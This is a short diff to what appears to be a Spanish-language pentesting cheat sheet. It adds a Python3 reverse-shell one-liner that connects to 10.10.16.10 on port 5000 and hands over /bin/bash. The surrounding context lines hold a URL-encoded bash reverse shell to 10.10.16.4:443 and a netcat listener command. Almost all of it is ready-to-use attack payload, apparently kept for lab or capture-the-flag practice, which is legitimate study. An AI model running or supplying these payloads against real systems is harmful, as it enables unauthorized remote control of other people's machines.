@@ -23,6 +23,13 @@ Ejemplo: bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'
 
 Mientras tenemos que estar en escucha con [[nc -nlvp 443]]
 
+-----
+# Python3
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.10",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
+```
+
 
 
 ------
